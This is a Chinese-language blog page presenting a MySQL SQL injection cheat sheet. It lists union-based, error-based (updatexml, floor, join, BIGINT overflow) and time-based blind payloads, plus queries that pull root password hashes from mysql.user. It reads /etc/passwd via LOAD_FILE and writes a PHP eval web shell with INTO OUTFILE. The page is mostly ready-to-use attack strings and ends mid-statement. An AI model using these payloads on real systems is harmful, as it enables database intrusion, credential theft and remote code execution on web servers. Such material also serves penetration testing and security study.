<h3 id="常见语句格式"><a href="#常见语句格式" class="headerlink" title="常见语句格式"></a>常见语句格式</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式：               闭合：</span><br><span class="line">id=1                不需要</span><br><span class="line">id=&#x27;&#x27;               &#x27;#</span><br><span class="line">id=&quot;&quot;               &quot;#</span><br><span class="line">id=(&#x27;&#x27;)             &#x27;)--空格</span><br><span class="line">id=((&#x27;&#x27;))           &#x27;))/*</span><br></pre></td></tr></table></figure>

<h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p>假设有: <a target="_blank" rel="noopener" href="http://www.test.com/test.php?id=1">http://www.test.com/test.php?id=1</a></p>
<h4 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.php?id=1+1</span><br><span class="line">test.php?id=-1 or 1=1</span><br><span class="line">test.php?id=-1 or 10-2=8</span><br><span class="line">test.php?id=1 and 1=2</span><br><span class="line">test.php?id=1 and 1=1</span><br></pre></td></tr></table></figure>

<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数被引号包围，我们需要闭合引号。</span><br><span class="line">test.php?id=1&#x27;</span><br><span class="line">test.php?id=1&quot;</span><br><span class="line">test.php?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">test.php?id=1&quot; and &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">查询列数</span><br><span class="line">用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。这里以3列为例子。</span><br><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br><span class="line"></span><br><span class="line">使用union注入：</span><br><span class="line">（1）猜表名</span><br><span class="line">exists(select * from tab_name)</span><br><span class="line">存在返回1，不存在则报错&gt; 1146 - Table &#x27;库名.表名&#x27; doesn&#x27;t exist</span><br><span class="line"></span><br><span class="line">（2）猜列数</span><br><span class="line">union select 1,2,3</span><br><span class="line"></span><br><span class="line">（3）猜列名</span><br><span class="line">exists(select col_name from tab_name)</span><br><span class="line">存在返回1，不存在则报错&gt; 1054 - Unknown column &#x27;列名&#x27; in &#x27;field list&#x27;</span><br><span class="line"></span><br><span class="line">（4）猜字段</span><br><span class="line">爆出显示位：</span><br><span class="line">union select 1,2,3,4,5 from tab_name;</span><br><span class="line">替换显示位：</span><br><span class="line">union select 1,2,col_name,4,5 from tab_name;</span><br><span class="line"></span><br><span class="line">利用二分法</span><br><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure>

<h3 id="常用通用爆库数据"><a href="#常用通用爆库数据" class="headerlink" title="常用通用爆库数据"></a>常用通用爆库数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select(col_name)from(tab_name)where(length(passwd))=len                                             #猜长度</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata;                                  #MySQL &gt;= 5.0</span><br><span class="line">select distinct(db) from mysql.db                                                                   #需要特权</span><br><span class="line"></span><br><span class="line">select (group_concat(table_name)) from information_schema.tables where table_schema=database();     #当前库所有表名</span><br><span class="line">select (group_concat(column_name)) from information_schema.columns where (table_name=十六进制表名);  #一次爆出列名，十六进制表名要加0x，不用十六进制的时候，记得加单/双引号</span><br><span class="line">select column_name from information_schema.columns where table_name=十六进制表名 limit 0,1;          #爆列名，一条条来</span><br><span class="line">select 列名 from 表名;  </span><br><span class="line">select right(group_concat(列名),30) from 数据库名.表名                                                                             #爆记录</span><br><span class="line"></span><br><span class="line">备注：</span><br><span class="line">报错注入的话，用mysql.tab_name的形式，查询数据表</span><br></pre></td></tr></table></figure>

<h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.select Password from mysql.user where User=&#x27;root&#x27; limit 0,1;                      #查询root账户密码</span><br><span class="line">2.select authentication_string from mysql.user where User=&#x27;root&#x27; limit 0,1;			#查询root账户密码hash</span><br><span class="line">3.select table_name from information_schema.tables where table_schema=database();   #查询数据库的所有数据表</span><br><span class="line">4.update tab_name set col_name=val;                                                 #更新字段值</span><br><span class="line">5.insert into tab_name values(val1,val2);                                           #往tab_name表中插入一条字段1值为val1，字段2值为val2的记录</span><br><span class="line">6.delete from tab_name where col_name = val;                                        #删除一条字段为&quot;val&quot;的记录</span><br><span class="line">7.select count(*) from db_name.tab_name &gt;=1                                         #判断记录数是否大于等于1条</span><br><span class="line">8.select char_length((select id from apptest.answer limit 0,1))                     #判断记录长度</span><br><span class="line">9.show variables like &#x27;%char%&#x27;;                                                     #查看字符集</span><br><span class="line">10.show variables like &#x27;%secure%&#x27;;                                                   #查看可导出路径</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show databases# 查看数据库名</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show tables from english# 查看数据库中的表</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show tables#</span><br><span class="line"></span><br><span class="line">username=1&#x27;;show columns from score# 查看表中的字段</span><br><span class="line">堆叠查询</span><br><span class="line">username=1&#x27;;set @sql=concat(&#x27;up&#x27;,&#x27;date `score` set listen=123 where username=&quot;火华&quot;&#x27;);prepare sql_exe FROM @sql;execute sql_exe#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="其他insert-update-delete注入"><a href="#其他insert-update-delete注入" class="headerlink" title="其他insert&#x2F;update&#x2F;delete注入"></a>其他insert&#x2F;update&#x2F;delete注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2288</span><br><span class="line">https://www.anquanke.com/post/id/85487</span><br><span class="line">http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</span><br><span class="line">http://wps2015.org/drops/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</span><br><span class="line">http://vinc.top/2017/04/06/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91insert%E3%80%81update%E5%92%8Cdelete%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</span><br><span class="line">等待补充</span><br><span class="line"></span><br><span class="line">创建测试环境数据库sectest：</span><br><span class="line">CREATE DATABASE sectest;</span><br><span class="line">创建测试数据表math1：</span><br><span class="line">CREATE TABLE IF NOT EXISTS math1 (</span><br><span class="line">    student_id VARCHAR(20) NOT NULL COMMENT &#x27;学号&#x27;,</span><br><span class="line">    student_name VARCHAR(50) NOT NULL COMMENT &#x27;姓名&#x27;,</span><br><span class="line">    score INT DEFAULT 0 COMMENT &#x27;数学分数&#x27;,</span><br><span class="line">    PRIMARY KEY (student_id) -- 以学号作为主键</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;数学成绩表（极简版）&#x27;;</span><br><span class="line">插入测试数据10条：</span><br><span class="line">-- 第1组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025001&#x27;, &#x27;张三&#x27;, 98);</span><br><span class="line">-- 第2组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025002&#x27;, &#x27;李四&#x27;, 125);</span><br><span class="line">-- 第3组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025003&#x27;, &#x27;王五&#x27;, 76);</span><br><span class="line">-- 第4组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025004&#x27;, &#x27;赵六&#x27;, 142);</span><br><span class="line">-- 第5组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025005&#x27;, &#x27;孙七&#x27;, 59);</span><br><span class="line">-- 第6组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025006&#x27;, &#x27;周八&#x27;, 0);</span><br><span class="line">-- 第7组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025007&#x27;, &#x27;吴九&#x27;, 150);</span><br><span class="line">-- 第8组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025008&#x27;, &#x27;郑十&#x27;, 88);</span><br><span class="line">-- 第9组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025009&#x27;, &#x27;钱十一&#x27;, 110);</span><br><span class="line">-- 第10组数据</span><br><span class="line">INSERT INTO math1 (student_id, student_name, score) VALUES (&#x27;2025010&#x27;, &#x27;孙十二&#x27;, 67);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">#insert报错注入</span><br><span class="line">insert into math1 values (11,&#x27;name&#x27; xor updatexml(3,concat(0x7e,(version())),0) xor &#x27;&#x27;,123);</span><br><span class="line">insert into math1 values (23,&#x27;name&#x27;^updatexml(2,concat(0x7e,(version())),0)^&#x27;&#x27;,123);</span><br><span class="line">insert into math1 values (14,&#x27;name&#x27; or updatexml(2,concat(0x7e,(user())),0) or &#x27;&#x27;,123);</span><br><span class="line">insert into math1 values (14,&#x27;name&#x27; or updatexml(2,user(),0) or &#x27;&#x27;,123);</span><br><span class="line"></span><br><span class="line">#update报错注入</span><br><span class="line">update math1 set student_name = &#x27;test&#x27; and updatexml(2,concat(0x7e,(version())),0) and &#x27;&#x27;;</span><br><span class="line">update math1 set student_name = updatexml(2,concat(0x7e,(select concat_ws(0x7e, student_id, student_name)from(select * from math1) xx limit 0,1)),0)where student_id = &#x27;2025001&#x27;;</span><br><span class="line">#利用主键重复报错注入</span><br><span class="line">update math1 set student_name = ( select 1 from ( select count(*), concat( (select concat_ws(0x7e, student_id, student_name) from (select * from math1) xx limit 0,1), floor(rand(0)*2) ) x from information_schema.columns group by x ) a)where student_id = &#x27;2025001&#x27;;</span><br><span class="line"></span><br><span class="line">#delete报错注入</span><br><span class="line">delete from math1 where student_id = 2025001 or updatexml(2,concat(0x7e,(version())),0) or &#x27;&#x27;;</span><br><span class="line">delete from math1 where student_id = 2025001 or updatexml(2,concat(0x7e,(select user())),0);</span><br></pre></td></tr></table></figure>

<h3 id="使用load-file-读取文件"><a href="#使用load-file-读取文件" class="headerlink" title="使用load_file()读取文件"></a>使用load_file()读取文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">需要：</span><br><span class="line">1. 路径</span><br><span class="line">2. 文件名</span><br><span class="line">3. FILE权限</span><br><span class="line">4. 文件可读</span><br><span class="line">5. 目录可写，文件不能已存在</span><br><span class="line">6. 文件小于max_allowed_packet 字节</span><br><span class="line">#文件不满足上述条件，函数返回NUll</span><br><span class="line"></span><br><span class="line">判断:</span><br><span class="line">1. 必须有权限读取并且文件必须完全可读 </span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常,说明具有读写权限。</span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 返回错误，应该是管理员给数据库帐户降权了。</span><br><span class="line">2. 被读取文件必须在服务器上 </span><br><span class="line">3. 必须指定文件完整的路径 </span><br><span class="line">4. 欲读取文件必须小于 max_allowed_packet </span><br><span class="line"></span><br><span class="line">#读取 Linux 系统的 /etc/passwd 文件（系统用户信息文件，常作为测试目标）</span><br><span class="line">SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;);</span><br><span class="line"></span><br><span class="line">#读取 Windows 系统的 C:\Windows\system32\drivers\etc\hosts 文件（主机映射文件）</span><br><span class="line">SELECT LOAD_FILE(&#x27;C:\\Windows\\system32\\drivers\\etc\\hosts&#x27;); -- 注意：Windows 路径需用双反斜杠转义，或用正斜杠</span><br><span class="line">#等价写法（正斜杠）：</span><br><span class="line">SELECT LOAD_FILE(&#x27;C:/Windows/system32/drivers/etc/hosts&#x27;);</span><br><span class="line"></span><br><span class="line">#读取自定义文本文件</span><br><span class="line">SELECT LOAD_FILE(&#x27;/tmp/test.txt&#x27;);</span><br><span class="line"></span><br><span class="line">#获取hex编码后的文件内容</span><br><span class="line">SELECT hex(LOAD_FILE(&#x27;d:\\phpstudy_pro\\www\\flag.txt&#x27;));</span><br><span class="line"></span><br><span class="line">编码处理：</span><br><span class="line">#ASCII码</span><br><span class="line">SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</span><br><span class="line">#16进制</span><br><span class="line">SELECT LOAD_FILE(0x433a5c5c544553542e747874)</span><br><span class="line"></span><br><span class="line">排错：</span><br><span class="line">#1. 查看 secure-file-priv 配置</span><br><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;;</span><br><span class="line">#2. 查看 FILE 权限</span><br><span class="line">SHOW GRANTS FOR CURRENT_USER();</span><br><span class="line">#3. 检查文件路径是否正确（可通过 MySQL 服务器执行 `ls /etc/passwd` 或 `dir C:\Windows\system32\drivers\etc\hosts` 验证）</span><br></pre></td></tr></table></figure>
<h3 id="使用into-outfile写文件"><a href="#使用into-outfile写文件" class="headerlink" title="使用into outfile写文件"></a>使用into outfile写文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#写入小马testshell.php</span><br><span class="line">union select &#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;  into outfile &#x27;D:\\phpstudy_pro\\WWW\\testshell.php&#x27;;</span><br><span class="line">#写查询结果入文件flag.txt</span><br><span class="line">union select database() into outfile &#x27;d:\\phpstudy_pro\\www\\flag.txt&#x27;;</span><br></pre></td></tr></table></figure>
<h2 id="高级注入技术（limit，order，二次注入）"><a href="#高级注入技术（limit，order，二次注入）" class="headerlink" title="高级注入技术（limit，order，二次注入）"></a>高级注入技术（limit，order，二次注入）</h2><h3 id="limit后面注入"><a href="#limit后面注入" class="headerlink" title="limit后面注入"></a>limit后面注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">支持报错payload:</span><br><span class="line">procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line"></span><br><span class="line">不支持报错payload：</span><br><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br><span class="line"></span><br><span class="line">select BENCHMARK(40000000,SHA1(1));</span><br><span class="line"></span><br><span class="line">本机跑14s：</span><br><span class="line">select BENCHMARK(50000000,SHA1(1));</span><br><span class="line"></span><br><span class="line">limit后的注入，使用analyse()只能5.0.0&lt;mysql&lt;5.6.6的版本</span><br><span class="line">http://vinc.top/2016/06/20/mysql-order-by-%E5%90%8E%E6%B3%A8%E5%85%A5/</span><br><span class="line">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</span><br><span class="line">http://www.freebuf.com/articles/web/57528.html</span><br><span class="line">http://vinc.top/2017/04/01/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91mysql-limit-%E6%B3%A8%E5%85%A5/	(good)</span><br><span class="line">https://rdot.org/forum/showpost.php?p=36186&amp;postcount=30</span><br></pre></td></tr></table></figure>
<h3 id="order-by后面注入"><a href="#order-by后面注入" class="headerlink" title="order by后面注入"></a>order by后面注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</span><br><span class="line">判断是否存在注入：</span><br><span class="line">id+asc</span><br><span class="line">id+desc</span><br><span class="line">order by盲注:</span><br><span class="line">http://wonderkun.cc/index.html/?p=547</span><br></pre></td></tr></table></figure>
<p>盲注：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">需要知道字段名</span><br><span class="line">1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</span><br><span class="line"></span><br><span class="line">(select case when (true) then id else price end)</span><br><span class="line"></span><br><span class="line">if((selectchar(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128),id,price)</span><br><span class="line">条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</span><br><span class="line"></span><br><span class="line">1,基于表达式结果盲注</span><br><span class="line"></span><br><span class="line">案例：http://www.wooyun.org/bugs/wooyun-2010-07406</span><br><span class="line"></span><br><span class="line">不过以上的这些技巧都需要一些条件，目前看来order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式，利用方式也比较成熟。所以这些技巧只能用来开阔思路了。</span><br><span class="line"></span><br><span class="line">成熟的利用方式</span><br><span class="line">基于order by 1,2 时间盲注：</span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">asc,if(locate(\&#x27;&#x27;+payload+&#x27;\&#x27;,substring(user(),&#x27;+str(i)+&#x27;,1)),sleep(3),1)</span><br><span class="line">基于order by 1,2 引起mysql错误进行盲注</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">id,if(1=1,1,(select 1 from information_schema.tables))</span><br><span class="line">当条件为false是，值为select 1 from information_schema.tables，mysql会报错，Subquery returns more than 1 row，导致查询结果为空。</span><br><span class="line"></span><br><span class="line">案例：http://www.wooyun.org/bugs/wooyun-2010-076151</span><br><span class="line"></span><br><span class="line">基于 order by rand(true);order by rand(false);返回不同进行盲注</span><br><span class="line">payload:rand(ascii(mid(database(),1,1))=109)</span><br><span class="line"></span><br><span class="line">案例：http://www.wooyun.org/bugs/wooyun-2010-0152570</span><br><span class="line"></span><br><span class="line">关于order by rand(true)和order by rand(false)返回不同的培训原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数培训，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。</span><br><span class="line"></span><br><span class="line">参考这里的讨论：http://zone.wooyun.org/content/25733</span><br><span class="line"></span><br><span class="line">sqlmap利用方式</span><br><span class="line">使用level5 risk3</span><br><span class="line"></span><br><span class="line">Parameter: sort (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: sort=1 RLIKE (SELECT (CASE WHEN (9644=9644) THEN 1 ELSE 0x28 END))</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span><br><span class="line">    Payload: sort=1 AND (SELECT * FROM (SELECT(SLEEP(5)))MVan)</span><br></pre></td></tr></table></figure>
<h3 id="有回显位的SQL注入："><a href="#有回显位的SQL注入：" class="headerlink" title="有回显位的SQL注入："></a>有回显位的SQL注入：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">判断列数：</span><br><span class="line">order by num</span><br><span class="line"></span><br><span class="line">limit后可以利用：</span><br><span class="line">limit 1 into @,@    #（@为字段数）判断字段数@为mysql临时变量,这是两列的例子</span><br><span class="line"></span><br><span class="line">其他参考通用</span><br></pre></td></tr></table></figure>
<h3 id="无回显位但是有报错提示的："><a href="#无回显位但是有报错提示的：" class="headerlink" title="无回显位但是有报错提示的："></a>无回显位但是有报错提示的：</h3><h4 id="xpath报错注入-mysql-5-1-5，order-by后也可用-："><a href="#xpath报错注入-mysql-5-1-5，order-by后也可用-：" class="headerlink" title="xpath报错注入(mysql&gt;&#x3D;5.1.5，order by后也可用)："></a>xpath报错注入(mysql&gt;&#x3D;5.1.5，order by后也可用)：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(可获取31个字符)</span><br><span class="line">updatexml(1,concat(0x7e,(select/**/user()),0x7e),1)--+</span><br><span class="line">1&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br><span class="line">extractvalue(1,concat(0x24,(select/**/user())))</span><br></pre></td></tr></table></figure>
<h4 id="floor主键重复报错："><a href="#floor主键重复报错：" class="headerlink" title="floor主键重复报错："></a>floor主键重复报错：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">and (select count(*) from (select 1 union select null union select  !1)x group by concat((select user()),floor(rand(0)*2)));</span><br><span class="line"></span><br><span class="line">NAME_CONST列名重复报错(MySQL 5.0.12加入):</span><br><span class="line">and exists(select*from (select*from(select name_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br><span class="line">and exists(select*from (select*from(select name_const((select concat(user,password) from mysql.user limit 0,1),0))a join (select name_const((select concat(user,password) from mysql.user limit 0,1),0))b)c)</span><br></pre></td></tr></table></figure>
<h4 id="join报错注入："><a href="#join报错注入：" class="headerlink" title="join报错注入："></a>join报错注入：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">下面以爆mysql.user表为例爆字段名的过程：</span><br><span class="line">（1）爆第一个列名</span><br><span class="line">union select * from(select * from mysql.user a join mysql.user b)c;</span><br><span class="line">（2）爆第二个列名（使用using）</span><br><span class="line">union select * from(select * from mysql.user a join mysql.user b using(Host))c;</span><br><span class="line">（3）爆第三列名（还是使用using，参数是前两个列的列名）</span><br><span class="line">union select * from(select * from mysql.user a join mysql.user b using(Host,User))c;</span><br><span class="line">依次类推，只要修改语句的using即可。</span><br><span class="line">爆数据</span><br><span class="line">union select * from(select * from math1 a join math1 b using(id,name))c</span><br></pre></td></tr></table></figure>
<h4 id="BIGINT等数据类型溢出报错（mysql"><a href="#BIGINT等数据类型溢出报错（mysql" class="headerlink" title="BIGINT等数据类型溢出报错（mysql&lt;5.5.53可用，且报错信息长度有限）："></a>BIGINT等数据类型溢出报错（mysql&lt;5.5.53可用，且报错信息长度有限）：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select*from(select user())x));</span><br><span class="line">select !(select*from(select user())x)-~0;</span><br><span class="line">类推：</span><br><span class="line">select !hex((select*from(select user())x))-~0;</span><br><span class="line">select !ceil((select*from(select user())x))-~0;</span><br><span class="line">select !atan((select*from(select user())x))-~0;</span><br><span class="line">select !rand((select*from(select user())a))-~0;</span><br><span class="line">select 